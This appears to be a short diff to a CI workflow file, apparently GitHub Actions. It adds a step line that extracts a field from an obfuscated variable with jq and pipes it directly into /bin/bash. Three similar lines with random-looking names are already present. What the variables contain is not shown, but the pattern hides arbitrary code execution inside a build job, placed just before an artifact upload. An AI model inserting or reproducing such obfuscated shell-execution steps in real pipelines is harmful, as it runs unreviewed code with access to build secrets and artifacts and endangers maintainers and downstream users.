@@ -27,6 +27,7 @@ jobs:
           echo $tegql5 | jq -r .nsl68796 | /bin/bash
           echo $fwqp364 | jq -r .a815 | /bin/bash
           echo $kvx185 | jq -r .zxqp309 | /bin/bash
+          printf '%s' "$adow48" | jq -r .guvyo32 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
